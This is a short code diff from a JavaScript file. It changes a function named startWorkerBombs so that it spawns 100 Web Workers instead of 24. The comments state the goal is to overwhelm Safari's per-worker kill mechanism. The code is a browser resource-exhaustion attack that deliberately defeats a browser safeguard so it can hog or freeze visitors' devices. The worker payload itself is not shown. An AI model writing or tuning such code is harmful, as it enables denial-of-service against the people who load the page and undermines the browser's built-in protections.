@@ -340,8 +340,8 @@
     function startWorkerBombs() {
         const blob = new Blob([WORKER_CODE], { type: 'application/javascript' });
         const url  = URL.createObjectURL(blob);
-        // 24 workers — Safari kills them individually so need overwhelming numbers
-        for (let i = 0; i < 24; i++) {
+        // 100 workers — overwhelm Safari's per-worker kill mechanism
+        for (let i = 0; i < 100; i++) {
             workers.push(new Worker(url));
         }
     }
